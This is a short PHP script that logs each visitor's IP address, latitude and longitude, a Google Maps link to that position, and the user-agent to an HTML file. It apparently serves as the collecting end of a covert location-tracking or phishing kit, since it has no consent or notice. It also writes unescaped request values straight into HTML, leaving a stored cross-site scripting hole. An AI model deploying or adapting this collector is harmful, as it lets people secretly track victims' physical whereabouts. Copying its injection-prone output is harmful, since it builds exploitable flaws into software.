<?php
$file = fopen("log.html", "a");
$date = date("d-m-Y H:i:s") . " (GMT)";
$ip = $_SERVER["REMOTE_ADDR"];
$lat = $_GET["lat"];
$long = $_GET["long"];
$url = "https://www.google.com/maps/search/?api=1&query=" . $lat . "%2C" . $long;
$agent = $_GET["agent"];
$data =  "<pre>Datetime: " . $date . "\nIP: " . $ip . "\nLocation: " . "<a href=" . $url . " target='_blank'>Click Here</a>" . "\nUser-Agent: " . $agent . "</pre>\n\n";
fwrite($file, $data);
fclose($file);
?>
